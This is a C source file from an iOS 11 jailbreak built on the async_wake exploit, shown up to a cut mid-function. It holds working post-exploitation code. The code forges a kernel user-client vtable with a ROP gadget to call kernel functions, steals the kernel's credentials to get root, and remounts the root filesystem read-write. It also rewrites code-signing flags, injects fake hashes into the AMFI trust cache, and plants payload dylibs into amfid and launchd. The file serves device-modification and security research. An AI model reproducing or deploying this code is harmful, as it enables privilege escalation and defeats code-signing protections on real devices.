//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"
#include "kcall.h"
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

void calljailbreakd(pid_t PID);
// export PATH="$BOOTSTRAP_PREFIX/usr/local/bin:$BOOTSTRAP_PREFIX/usr/sbin:$BOOTSTRAP_PREFIX/usr/bin:$BOOTSTRAP_PREFIX/sbin:$BOOTSTRAP_PREFIX/bin"
#define BOOTSTRAP_PREFIX "bootstrap"

int cp(const char *to, const char *from)
{
	int fd_to, fd_from;
	char buf[4096];
	ssize_t nread;
	int saved_errno;
	
	fd_from = open(from, O_RDONLY);
	if (fd_from < 0)
		return -1;
	
	fd_to = open(to, O_WRONLY | O_CREAT | O_EXCL, 0666);
	if (fd_to < 0)
		goto out_error;
	
	while (nread = read(fd_from, buf, sizeof buf), nread > 0)
	{
		char *out_ptr = buf;
		ssize_t nwritten;
		
		do {
			nwritten = write(fd_to, out_ptr, nread);
			
			if (nwritten >= 0)
			{
				nread -= nwritten;
				out_ptr += nwritten;
			}
			else if (errno != EINTR)
			{
				goto out_error;
			}
		} while (nread > 0);
	}
	
	if (nread == 0)
	{
		if (close(fd_to) < 0)
		{
			fd_to = -1;
			goto out_error;
		}
		close(fd_from);
		
		/* Success! */
		return 0;
	}
	
out_error:
	saved_errno = errno;
	
	close(fd_from);
	if (fd_to >= 0)
		close(fd_to);
	
	errno = saved_errno;
	return -1;
}


#include <CommonCrypto/CommonDigest.h>

typedef struct __BlobIndex {
	uint32_t type;                                  /* type of entry */
	uint32_t offset;                                /* offset of entry */
} CS_BlobIndex;

typedef struct __SuperBlob {
	uint32_t magic;                                 /* magic number */
	uint32_t length;                                /* total length of SuperBlob */
	uint32_t count;                                 /* number of index entries following */
	CS_BlobIndex index[];                   /* (count) entries */
	/* followed by Blobs in no particular order as indicated by offsets in index */
} CS_SuperBlob;


uint32_t swap_uint32( uint32_t val )
{
	val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
	return (val << 16) | (val >> 16);
}

void getSHA256inplace(const uint8_t* code_dir, uint8_t *out) {
    if (code_dir == NULL) {
        printf("NULL passed to getSHA256inplace!\n");
        return;
    }
    uint32_t* code_dir_int = (uint32_t*)code_dir;

    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
            realsize = swap_uint32(code_dir_int[j+1]);
            code_dir += 4*j;
        }
    }
//    printf("%08x\n", realsize);

    CC_SHA256(code_dir, realsize, out);
}

uint8_t *getSHA256(const uint8_t* code_dir) {
	uint8_t *out = malloc(CC_SHA256_DIGEST_LENGTH);
    getSHA256inplace(code_dir, out);
    return out;
}

#include <mach-o/loader.h>
uint8_t *getCodeDirectory(const char* name) {
    // Assuming it is a macho
    
    FILE* fd = fopen(name, "r");
    if (fd == NULL) return NULL;

    uint32_t magic;
    fread(&magic, sizeof(magic), 1, fd);
    fseek(fd, 0, SEEK_SET);

    long off;
    int ncmds;

    if (magic == MH_MAGIC_64) {
//        printf("%s is 64bit macho\n", name);
        struct mach_header_64 mh64;
        fread(&mh64, sizeof(mh64), 1, fd);
        off = sizeof(mh64);
        ncmds = mh64.ncmds;
    } else if (magic == MH_MAGIC) {
        struct mach_header mh;
//        printf("%s is 32bit macho\n", name);
        fread(&mh, sizeof(mh), 1, fd);
        off = sizeof(mh);
        ncmds = mh.ncmds;
    } else {
        printf("%s is not a macho! (or has foreign endianness?) (magic: %x)\n", name, magic);
        return NULL;
    }

    for (int i = 0; i < ncmds; i++) {
        struct load_command cmd;
        fseek(fd, off, SEEK_SET);
        fread(&cmd, sizeof(struct load_command), 1, fd);
        if (cmd.cmd == LC_CODE_SIGNATURE) {
            uint32_t off_cs;
            fread(&off_cs, sizeof(uint32_t), 1, fd);
            uint32_t size_cs;
            fread(&size_cs, sizeof(uint32_t), 1, fd);
//            printf("found CS in '%s': %d - %d\n", name, off_cs, size_cs);

            uint8_t *cd = malloc(size_cs);
            fseek(fd, off_cs, SEEK_SET);
            fread(cd, size_cs, 1, fd);
            return cd;
        } else {
//            printf("'%s': loadcmd %02x\n", name, cmd.cmd);
            off += cmd.cmdsize;
        }
    }
    return NULL;
}

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_p_textvp = 0x248;           // proc_t::p_textvp
unsigned offsetof_p_textoff = 0x250;          // proc_t::p_textoff
unsigned offsetof_p_cputype = 0x2c0;          // proc_t::p_cputype
unsigned offsetof_p_cpu_subtype = 0x2c4;      // proc_t::p_cpu_subtype
unsigned offsetof_special = 2 * sizeof(long); // host::special

unsigned offsetof_v_type = 0x70;              // vnode::v_type
unsigned offsetof_v_id = 0x74;                // vnode::v_id
unsigned offsetof_v_ubcinfo = 0x78;           // vnode::v_ubcinfo
unsigned offsetof_v_mount = 0xd8;             // vnode::v_mount

unsigned offsetof_mnt_flag = 0x70;            // mount::mnt_flag

unsigned offsetof_ubcinfo_csblobs = 0x50;     // ubc_info::csblobs

unsigned offsetof_csb_cputype = 0x8;          // cs_blob::csb_cputype
unsigned offsetof_csb_flags = 0x12;           // cs_blob::csb_flags
unsigned offsetof_csb_base_offset = 0x16;     // cs_blob::csb_base_offset
unsigned offsetof_csb_entitlements_offset = 0x98; // cs_blob::csb_entitlements
unsigned offsetof_csb_signer_type = 0xA0;     // cs_blob::csb_signer_type
unsigned offsetof_csb_platform_binary = 0xA4; // cs_blob::csb_platform_binary
unsigned offsetof_csb_platform_path = 0xA8;   // cs_blob::csb_platform_path

#define	CS_VALID		0x0000001	/* dynamically valid */
#define CS_ADHOC		0x0000002	/* ad hoc signed */
#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
#define CS_INSTALLER		0x0000008	/* has installer entitlement */

#define	CS_HARD			0x0000100	/* don't load invalid pages */
#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
#define CS_REQUIRE_LV		0x0002000	/* require library validation */
#define CS_ENTITLEMENTS_VALIDATED	0x0004000

#define	CS_ALLOWED_MACHO	0x00ffffe

#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */

char *itoa(long n)
{
    int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
    if (n<0) len++; // room for negative sign '-'
    
    char    *buf = calloc(sizeof(char), len+1); // +1 for null
    snprintf(buf, len+1, "%ld", n);
    return   buf;
}

kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

mach_port_t tfpzero;

int file_exist(char *filename) {
	struct stat buffer;
	int r = stat(filename, &buffer);
	return (r == 0);
}

size_t kread(uint64_t where, void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		mach_vm_size_t sz, chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
		if (rv || sz == 0) {
			fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
			break;
		}
		offset += sz;
	}
	return offset;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		size_t chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, chunk);
		if (rv) {
			fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
			break;
		}
		offset += chunk;
	}
	return offset;
}

static uint64_t kalloc(vm_size_t size){
	mach_vm_address_t address = 0;
	mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
	return address;
}

#define OSDictionary_ItemCount(dict) rk32(dict+20)
#define OSDictionary_ItemBuffer(dict) rk64(dict+32)
#define OSDictionary_ItemKey(buffer, idx) rk64(buffer+16*idx)
#define OSDictionary_ItemValue(buffer, idx) rk64(buffer+16*idx+8)
uint32_t SetObjectWithCharP = 8*31;
#define OSDictionary_SetItem(dict, str, val) {\
uint64_t s = kalloc(strlen(str)+1); kwrite(s, str, strlen(str)); \
kexecute(rk64(rk(dict)+SetObjectWithCharP), dict, s, val, 0, 0, 0, 0); \
}
#define OSString_CStringPtr(str) rk64(str+0x10)

uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    return returnval;
}

void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
	
	kern_return_t err;
	
	tfpzero = tfp0;
	
	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
	// Get the slide
    uint64_t kernel_base = find_kernel_base();
	uint64_t slide = kernel_base - 0xFFFFFFF007004000;
	printf("slide: 0x%016llx\n", slide);
	
	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
	uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
	uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
	
	// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
	// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel

	
	// Create the vtable in the kernel memory, then copy the existing vtable into there
	uint64_t fake_vtable = kalloc(0x1000);
	printf("Created fake_vtable at %016llx\n", fake_vtable);
	
	for (int i = 0; i < 0x200; i++) {
		wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
	}
	
	printf("Copied some of the vtable over\n");
	
	
	// Create the fake user client
	uint64_t fake_client = kalloc(0x1000);
	printf("Created fake_client at %016llx\n", fake_client);
	
	for (int i = 0; i < 0x200; i++) {
		wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
	}
	
	printf("Copied the user client over\n");
	
	// Write our fake vtable into the fake user client
	wk64(fake_client, fake_vtable);
	
	// Replace the user client with ours
	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
	
	// Now the userclient port we have will look into our fake user client rather than the old one
	
	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
	wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
	
	printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
	
	// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
	// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
	// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
	// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
	// through like normal.
	
	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
	// (i'm not actually sure if the switch back is necessary but meh
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
do { \
	uint64_t offx20 = rk64(fake_client+0x40); \
	uint64_t offx28 = rk64(fake_client+0x48); \
	wk64(fake_client+0x40, x0); \
	wk64(fake_client+0x48, addr); \
	err = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6)); \
	wk64(fake_client+0x40, offx20); \
	wk64(fake_client+0x48, offx28); \
} while (0);
	
	// Get our and the kernels struct proc from allproc
	uint32_t our_pid = getpid();
	uint64_t our_proc = 0;
	uint64_t kern_proc = 0;
	uint64_t amfid_proc = 0;
    uint32_t amfid_pid = 0;
	
	uint64_t proc = rk64(find_allproc());
	while (proc) {
		uint32_t pid = (uint32_t)rk32(proc + offsetof_p_pid);
		char name[40] = {0};
		kread(proc+0x268, name, 20);
//		printf("%s\n",name);
		if (pid == our_pid) {
			our_proc = proc;
		} else if (pid == 0) {
			kern_proc = proc;
		} else if (strstr(name, "amfid")) {
			printf("found amfid - getting task\n");
            amfid_proc = proc;
            amfid_pid = pid;
            
            uint32_t csflags = rk32(proc + offsetof_p_csflags);
            wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
		}
		/*if (pid != 0) {
			uint32_t csflags = rk32(proc + offsetof_p_csflags);
            printf("CSFlags for %s (PID: %d): 0x%x; ", name, pid, csflags);
            
            cpu_type_t cputype = rk32(proc + offsetof_p_cputype);
            cpu_subtype_t cpusubtype = rk32(proc + offsetof_p_cpu_subtype);
            
            printf("\tCPU Type: 0x%x. Subtype: 0x%x\n", cputype, cpusubtype);
            
            uint64_t ucreds = rk64(proc + offsetof_p_ucred);
            uint64_t amfi_entitlements = rk64(rk64(ucreds + 0x78) + 0x8);
            printf("\tAMFI Entitlements at 0x%llx\n", amfi_entitlements);
            
            uint64_t textvp = rk64(proc + offsetof_p_textvp); //vnode of executable
            off_t textoff = rk64(proc + offsetof_p_textoff);
            
            printf("\t__TEXT at 0x%llx. Offset: 0x%llx\n", textvp, textoff);
            
            if (textvp != 0){
                uint32_t vnode_type_tag = rk32(textvp + offsetof_v_type);
                uint16_t vnode_type = vnode_type_tag & 0xffff;
                uint16_t vnode_tag = (vnode_type_tag >> 16);
                printf("\tVNode Type: 0x%x. Tag: 0x%x.\n", vnode_type, vnode_tag);
                
                if (vnode_type == 1){
                    uint64_t ubcinfo = rk64(textvp + offsetof_v_ubcinfo);
                    printf("\t\tUBCInfo at 0x%llx.\n", ubcinfo);
                    
                    uint64_t csblobs = rk64(ubcinfo + offsetof_ubcinfo_csblobs);
                    while (csblobs != 0){
                        printf("\t\t\tCSBlobs at 0x%llx.\n", csblobs);
                        
                        cpu_type_t csblob_cputype = rk32(csblobs + offsetof_csb_cputype);
                        unsigned int csblob_flags = rk32(csblobs + offsetof_csb_flags);
                        off_t csb_base_offset = rk64(csblobs + offsetof_csb_base_offset);
                        uint64_t csb_entitlements = rk64(csblobs + offsetof_csb_entitlements_offset);
                        unsigned int csb_signer_type = rk32(csblobs + offsetof_csb_signer_type);
                        unsigned int csb_platform_binary = rk32(csblobs + offsetof_csb_platform_binary);
                        unsigned int csb_platform_path = rk32(csblobs + offsetof_csb_platform_path);
                        
                        printf("\t\t\tCSBlob CPU Type: 0x%x. Flags: 0x%x. Offset: 0x%llx\n", csblob_cputype, csblob_flags, csb_base_offset);
                        
                        printf("\t\t\tCSBlob Signer Type: 0x%x. Platform Binary: %d Path: %d\n", csb_signer_type, csb_platform_binary, csb_platform_path);
                        
                        printf("\t\t\t\tEntitlements at 0x%llx.\n", csb_entitlements);
                        
                        for (int idx = 0; idx < OSDictionary_ItemCount(csb_entitlements); idx++) {
                            uint64_t key = OSDictionary_ItemKey(OSDictionary_ItemBuffer(csb_entitlements), idx);
                            uint64_t keyOSStr = OSString_CStringPtr(key);
                            size_t length = kexecute(user_client, fake_client, 0xFFFFFFF00709BDE0+slide, keyOSStr, 0, 0, 0, 0, 0, 0); //strlen
                            char* s = (char*)calloc(length+1, 1);
                            kread(keyOSStr, s, length);
                            printf("\t\t\t\t\tEntitlement: %s\n", s);
                            free(s);
                        }
                        
                        csblobs = rk64(csblobs);
                    }
                }
            }
		}*/
		proc = rk64(proc);
	}
	
	printf("our proc is at 0x%016llx\n", our_proc);
	printf("kern proc is at 0x%016llx\n", kern_proc);
	
	// Give us some special flags
//	uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
//	wk32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
	
	// Properly copy the kernel's credentials so setuid(0) doesn't crash
	uint64_t kern_ucred = 0;
	KCALL(find_copyout(), kern_proc+0x100, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    
	uint64_t self_ucred = 0;
	KCALL(find_copyout(), our_proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);

	KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
	KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
	
	setuid(0);
	
	printf("our uid is %d\n", getuid());
	
	FILE *f = fopen("/var/mobile/test.txt", "w");
	if (f == 0) {
		printf("failed to write test file");
	} else {
		printf("wrote test file: %p\n", f);
	}
    
    unlink("/var/mobile/test.txt");
	
	// Remount / as rw - patch by xerub with nosuid patch added by coolstar
	{
		uint64_t _rootvnode = find_rootvnode();
		uint64_t rootfs_vnode = rk64(_rootvnode);
		uint64_t v_mount = rk64(rootfs_vnode + offsetof_v_mount);
		uint32_t v_flag = rk32(v_mount + offsetof_mnt_flag);
		
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        
		wk32(v_mount + offsetof_mnt_flag, v_flag & ~MNT_ROOTFS);
		
		char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("apfs", "/", MNT_UPDATE, (void *)&nmz);
		printf("remounting: %d\n", rv);
		
		v_mount = rk64(rootfs_vnode + offsetof_v_mount);
		wk32(v_mount + offsetof_mnt_flag, v_flag);
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("File already exists!\n");
		}
		close(fd);
	}
	
	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
    
    unlink("/.bit_of_fun");
    
    FILE *fp = popen("/sbin/mount", "r");
    
    char *ln = NULL;
    size_t len = 0;
    
    while (getline(&ln, &len, fp) != -1)
        fputs(ln, stdout);
    fclose(fp);
    
    // Prepare our binaries
    {
        if (!file_exist("/fun_bins")) {
            printf("making /fun_bins");
            mkdir("/fun_bins", 0755);
        }
        
        /* uncomment if you need to replace the binaries */
        unlink("/fun_bins/inject_amfid");
        unlink("/fun_bins/amfid_payload.dylib");
        unlink("/fun_bins/inject_launchd");
        unlink("/fun_bins/launchd_payload.dylib");
        unlink("/fun_bins/xpcproxy_payload.dylib");
        
        if (!file_exist("/fun_bins/inject_amfid")) {
            printf("copy /fun_bins/inject_amfid\n");
            cp("/fun_bins/inject_amfid", progname("inject_amfid"));
            chmod("/fun_bins/inject_amfid", 0755);
        }
        if (!file_exist("/fun_bins/amfid_payload.dylib")) {
            printf("copy /fun_bins/amfid_payload.dylib\n");
            cp("/fun_bins/amfid_payload.dylib", progname("amfid_payload.dylib"));
            chmod("/fun_bins/amfid_payload.dylib", 0755);
        }
        if (!file_exist("/fun_bins/inject_launchd")) {
            printf("copy /fun_bins/inject_launchd\n");
            cp("/fun_bins/inject_launchd", progname("inject_launchd"));
            chmod("/fun_bins/inject_launchd", 0755);
        }
        if (!file_exist("/fun_bins/launchd_payload.dylib")) {
            printf("copy /fun_bins/launchd_payload.dylib\n");
            cp("/fun_bins/launchd_payload.dylib", progname("launchd_payload.dylib"));
            chmod("/fun_bins/launchd_payload.dylib", 0755);
        }
        if (!file_exist("/fun_bins/xpcproxy_payload.dylib")) {
            printf("copy /fun_bins/xpcproxy_payload.dylib\n");
            cp("/fun_bins/xpcproxy_payload.dylib", progname("xpcproxy_payload.dylib"));
            chmod("/fun_bins/xpcproxy_payload.dylib", 0755);
        }
        
        printf("[fun] copied the required binaries into the right places\n");
    }

    inject_trusts(5, (const char **)&(const char*[]){
        "/fun_bins/inject_amfid",
        "/fun_bins/amfid_payload.dylib",
        "/fun_bins/inject_launchd",
        // fuck this shit, just "stuff" the trustcache
        "/fun_bins/launchd_payload.dylib",
        "/Library/Substitute/Helpers/posixspawn-hook.dylib",
    });
    
#define BinaryLocation_amfid "/fun_bins/inject_amfid"
    
    pid_t pd;
    
    const char* args_amfid[] = {BinaryLocation_amfid, itoa(amfid_pid), NULL};
    int rv = posix_spawn(&pd, BinaryLocation_amfid, NULL, NULL, (char **)&args_amfid, NULL);
    waitpid(pd, NULL, 0);

//	uint8_t launchd[19];
//	kread(find_amficache()+0x11358, launchd, 19);
//
//	uint8_t really[19] = {0xdb, 0x75, 0x57, 0x7d, 0x9c, 0x5c, 0xc2, 0xe7, 0x83, 0x7d, 0xa8, 0x66, 0x6a, 0x05, 0xc7, 0x17, 0x7e, 0xdb, 0xd3};
//
//	printf("%d\n", memcmp(launchd, really, 19)); // == 0

	
//	mkdir("/Library/LaunchDaemons", 777);
//	cp("/Library/LaunchDaemons/test_fsigned.plist", plistPath2());

    mkdir("/" BOOTSTRAP_PREFIX, 0755);
    const char *tar = "/" BOOTSTRAP_PREFIX "/tar";
    cp(tar, progname("tar"));
    chmod(tar, 0755);
    inject_trusts(1, (const char **)&(const char*[]){tar});
    
    unlink("/"BOOTSTRAP_PREFIX"/jailbreakd");
    cp("/"BOOTSTRAP_PREFIX"/jailbreakd", progname("jailbreakd"));
    chmod("/"BOOTSTRAP_PREFIX"/jailbreakd", 0755);

    rv = startprog(kern_ucred, true, tar, (char **)&(const char*[]){ tar, "-xpf", progname("gnubinpack.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL }, NULL);
    unlink(tar);

    unlink("/"BOOTSTRAP_PREFIX"/launchjailbreak");
    const char *launchjailbreak = "/" BOOTSTRAP_PREFIX "/launchjailbreak";
    cp(launchjailbreak, progname("launchjailbreak"));
    chmod(launchjailbreak, 0755);
    
    printf("Dropbear would be up soon\n");
    printf("Note: to use SFTP clients (such as Cyberduck, Filezilla, etc.) please run: 'ln -s /"BOOTSTRAP_PREFIX"/usr/libexec/sftp-server /usr/libexec/sftp-server'\n");
    printf("Note: to use clear/nano/reset (or other ncurses commands) please run: 'ln -s /"BOOTSTRAP_PREFIX"/usr/share/terminfo /usr/share/terminfo'\n");
    
    pid_t launchjailbreak_pid;
    rv = posix_spawn(&launchjailbreak_pid, launchjailbreak, NULL, NULL, (char **)&(const char*[]){launchjailbreak, NULL}, NULL);
	waitpid(launchjailbreak_pid, NULL, 0);
	
	// zzz AMFI sucks..
	/*
	 	Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
	 
	 	So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
	 	What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
	 	used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
	 	to get every hash, or just the main CDHash and insert that one into the trust chain?
	 
	 	If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
	 	the following (struct from xerub, but I've checked with AMFI that it is the case):
	 
		struct trust_mem {
			uint64_t next; 				// +0x00 - the next struct trust_mem
			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
			unsigned int count;			// +0x18 - Number of hashes there are
			unsigned char hashes[];		// +0x1C - The hashes
		}
	 
		The trust chain checker does the following:
	 	- Find the first struct that has a count > 0
	 	- Loop through all the hashes in the struct, comparing with the current hash
	 	- Keeps going through each chain, then when next is 0, it finishes
	 
		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
	 			 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
	 				This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
	 
		 So our execution method is as follows:
		 - Calculate the CD Hashes for the target resources that we want to play around with
		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
	     - ??? PROFIT
	 */
	
	// Cleanup

    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);

    printf("Starting server...\n");
    mach_port_t pass_port = MACH_PORT_NULL;
    start_jailbreakd(kern_ucred, &pass_port, tfp0, kernel_base);

    // let jailbreakd finish spamming in log
    sleep(2);
    do {
        // probably we only need to give launchd skip-library-validation
        // and unset CS_KILL, but meh
        calljailbreakd(1);
        // let jelbrekd finish
        sleep(1);

        extern mach_port_t build_fake_tfp(uint32_t pid);
#define BinaryLocation_launchd "/fun_bins/inject_launchd"
        mach_port_t sp;
        task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &sp);
        mach_port_t fake_launchd_task = build_fake_tfp(1);
        if (fake_launchd_task == MACH_PORT_NULL) {
            break;
        }
        task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, fake_launchd_task);

        const char* args_launchd[] = {BinaryLocation_launchd, NULL};
        rv = posix_spawn(&pd, BinaryLocation_launchd, NULL, NULL, (char **)&args_launchd, NULL);
        task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, sp);

        int status;
        waitpid(pd, &status, 0);
        printf("inject_launchd exited with status %d\n", status);
    } while (0);

	wk64(rk64(kern_ucred+0x78)+0x8, 0);
}


// thx hieplpvip
void inject_trusts(int pathc, const char *paths[]) {
    static uint64_t tc = 0;
    if (tc == 0) tc = find_trustcache();
    
    typedef char hash_t[20];

    struct trust_chain {
        uint64_t next;
        unsigned char uuid[16];
        unsigned int count;
    } __attribute__((packed));

    struct trust_chain fake_chain;
    fake_chain.next = rk64(tc);
    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;

    int cnt = 0;
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    hash_t *allhash = malloc(sizeof(hash_t) * pathc);
    for (int i = 0; i != pathc; ++i) {
        uint8_t *cd = getCodeDirectory(paths[i]);
        if (cd != NULL) {
            getSHA256inplace(cd, hash);
            memmove(allhash[cnt], hash, sizeof(hash_t));
            ++cnt;
        }
    }

    fake_chain.count = cnt;

    size_t length = (sizeof(fake_chain) + cnt * sizeof(hash_t) + 0xFFFF) & ~0xFFFF;
    uint64_t kernel_trust = kalloc(length);

    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
    kwrite(kernel_trust + sizeof(fake_chain), allhash, cnt * sizeof(hash_t));
    wk64(tc, kernel_trust);
}

int setcsflags(int pd){
